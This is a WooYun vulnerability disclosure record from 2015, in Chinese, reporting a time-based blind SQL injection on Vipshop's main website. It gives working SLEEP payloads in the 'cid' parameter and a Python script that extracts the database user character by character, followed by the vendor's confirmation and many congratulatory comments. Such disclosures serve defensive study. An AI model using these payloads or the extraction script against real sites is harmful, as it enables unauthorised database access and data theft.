{"id": 71701, "wybug_id": "wooyun-2015-0148436", "wybug_title": "唯品会www主站存在SQL注入漏洞", "wybug_corp": "唯品会", "wybug_author": "猪猪侠", "wybug_date": "2015-10-21 17:54", "wybug_open_date": "2015-12-06 14:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向公众公开  简要描述： 唯品会www主站存在SQL注入漏洞，说好的WAF呢？ 详细说明：  #1 注入点\nhttp://www.vip.com/beauty.php?cid=9&stock=9&order=9&page=9注入参数：cid\n#2 注入参数\nhttp://www.vip.com/beauty.php?cid=9);(SELECT * FROM (SELECT(SLEEP(5)))ring)&stock=9&order=9&page=9\nSLEEP，5秒后成功打开网页   漏洞证明：  # 10秒\nhttp://www.vip.com/beauty.php?cid=9);(SELECT * FROM (SELECT(SLEEP(10)))ring)&stock=9&order=9&page=9写个脚本跑。。。。数据库 > 5.0.11\n# 跑用户名\nhttp://www.vip.com/beauty.php?cid=9);(SELECT * FROM (SELECT(SLEEP(LENGTH(USER()))))ring)&stock=9&order=9&page=9大概停了18秒\n\n\nmask 区域\n*****.200*****\n\n# 跑数据库\nhttp://www.vip.com/beauty.php?cid=9);(SELECT * FROM (SELECT(SLEEP(LENGTH(DATABASE()))))ring)&stock=9&order=9&page=9大概停了14秒\n\n\nmask 区域\n*****op_*****\n\n以3秒为指数\nhttp://www.vip.com/beauty.php?cid=9);(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER()),1,1))=114)*3)))ring)&stock=9&order=9&page=9\n\n#!/usr/bin/env python# encoding: utf-8# vip.py # ringzero@0x557.orgimport requestsimport timeimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,20):    for _str in payloads:        start_time = time.time()        url = \"http://www.vip.com/beauty.php?cid=9);(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER()),\" + str(i) + \",1))=\" + str(ord(_str)) + \")*5)))ring)&stock=9&order=9&page=9\"        result = requests.get(url).text        if(time.time() - start_time) > 3:            print _str            break\n   修复方案：  # 你们比我懂   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-10-22 14:32 厂商回复： 非常感谢猪猪侠的报告使我们修复了一个严重的安全问题，谢谢您对唯品会信息安全的支持和关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-21 17:54 |    \t\t3King \t\t\t( 普通白帽子  |\t\t\t        Rank:1139 漏洞数:94        | 【study at HNUST】非常感谢大家的关注~ 大...)\t\t \n  前排占座    \n     2015-10-21 17:55 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:17        | .)\t\t \n  前排膜拜    \n     2015-10-21 17:55 |    \t\t慢慢 \t\t\t( 普通白帽子  |\t\t\t        Rank:620 漏洞数:178        | 学习新姿势~)\t\t \n  这是猪猪侠在测试新改版神器？    \n     2015-10-21 17:57 |    \t\t无证白帽 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | null)\t\t \n  前排膜拜www    \n     2015-10-21 17:59 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  wocao    \n     2015-10-21 18:00 |    \t\tgetshell1993 \t\t\t( 普通白帽子  |\t\t\t        Rank:678 漏洞数:77        | ~！@#￥%……&*)\t\t \n  主站…    \n     2015-10-21 18:04 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:522 漏洞数:78        | 潜心学习~~~)\t\t \n  哎呀wocaowocao，丧(gan)心(de)病(piao)狂(liang)    \n     2015-10-21 18:07 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2107 漏洞数:296        | 天天向上 ！！！)\t\t \n  吓死了，我靠    \n     2015-10-21 18:07 |    \t\tnull_z \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:44        )\t\t \n  Niniubi     \n     2015-10-21 18:09 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1741 漏洞数:278        | ...........................................)\t\t \n  屌啊    \n     2015-10-21 18:10 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | 我是来打酱油的。)\t\t \n  只关心送什么    \n     2015-10-21 18:10 |    \t\t神笔马良 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:45        | 爱写字的马)\t\t \n  cao 打脸漏洞    \n     2015-10-21 18:17 |    \t\t沦沦 \t\t\t( 普通白帽子  |\t\t\t        Rank:586 漏洞数:138        | 爱老婆，爱生活)\t\t \n  吓死我了    \n     2015-10-21 18:25 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:170 漏洞数:56        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  牛逼。。。目测在测试神器    \n     2015-10-21 18:39 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:545 漏洞数:87        | ®高级安全工程师 | WooYun认证√)\t\t \n  说好的WAF呢？    \n     2015-10-21 18:42 |    \t\tjust_joker \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:18        | ..........)\t\t \n  那些年说好的WAF呐    \n     2015-10-21 18:59 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:491 漏洞数:107        | 卖WB，1:10)\t\t \n  666666666    \n     2015-10-21 19:37 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:608 漏洞数:56        | 每个男人心中都住着一个叫小红的88号技师。)\t\t \n  好吓人。。。    \n     2015-10-21 19:38 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区枫叶正...)\t\t \n  看偶像大作.希望快点审核到Wo W    \n     2015-10-21 20:16 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:598 漏洞数:75        | 非妹子勿扰···)\t\t \n  @孤独雪狼 强势打脸啊    \n     2015-10-21 20:18 |    \t\tLoveSnow \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:4        | 以正和，以奇胜！)\t\t \n  猪哥，这是又在测神器    \n     2015-10-21 20:57 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:19        | TXTSEC信息安全团队)\t\t \n  wocao     \n     2015-10-21 21:18 |    \t\t白无常 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:7        )\t\t \n  来签到了    \n     2015-10-21 21:26 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:29        | 不会挖洞洞的猿猿不是好学生)\t\t \n  好吓人。。。    \n     2015-10-21 21:46 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:190 漏洞数:51        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  说好的WAF呢？运维在干嘛    \n     2015-10-21 22:07 |    \t\t撸大叔 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:11        | 钓鱼培养耐心  养鱼需要精心！)\t\t \n  膜拜www    \n     2015-10-21 22:34 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:29        | nopu)\t\t \n  前排膜拜，说好的WAF呢？    \n     2015-10-21 22:42 |    \t\tHerolon \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:44        | ******)\t\t \n  CCAV出来    \n     2015-10-21 23:12 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  WAF也拦不住你啊    \n     2015-10-21 23:54 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | for fun……)\t\t \n  主站，膜膜膜    \n     2015-10-22 07:53 |    \t\thack_lan \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:5        | 爱好linux开源架构，安全，python)\t\t \n  卧槽，这也太给力了，主站的    \n     2015-10-22 08:40 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:514 漏洞数:61        | 没有我，你们就去背IP吧)\t\t \n  唯品会说欢迎来私有src。。。    \n     2015-10-22 08:49 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  膜拜www    \n     2015-10-22 10:55 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:12        | 我是一颗小小树)\t\t \n  主站，好屌，学习    \n     2015-10-22 14:47 |    \t\tpython \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 一直在门外转悠！)\t\t \n  应用层面的问题，好牛！    \n     2015-10-22 15:16 |    \t\t残冰 \t\t\t( 普通白帽子  |\t\t\t        Rank:202 漏洞数:30        | 专业爆破5000000000000000000000年)\t\t \n  还有位置，来抢个座    \n     2015-10-22 15:35 |    \t\t一只鱼 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 寻水的雨)\t\t \n  涨姿势。混脸熟    \n     2015-10-22 16:11 |    \t\t左手 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:13        | whoaryou)\t\t \n  6    \n     2015-10-22 16:16 |    \t\tleo335 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        )\t\t \n  关注    \n     2015-10-22 17:16 |    \t\tRainystar \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 低调求发展.)\t\t \n  6    \n     2015-10-27 23:02 |    \t\t指尖的温度 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:9        )\t\t \n  哎呀wocaowocao，丧(gan)心(de)病(piao)狂(liang)    \n     2015-10-28 19:21 |    \t\t❤ \t\t\t( 普通白帽子  |\t\t\t        Rank:278 漏洞数:70        | ❤)\t\t \n  @孤独雪狼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}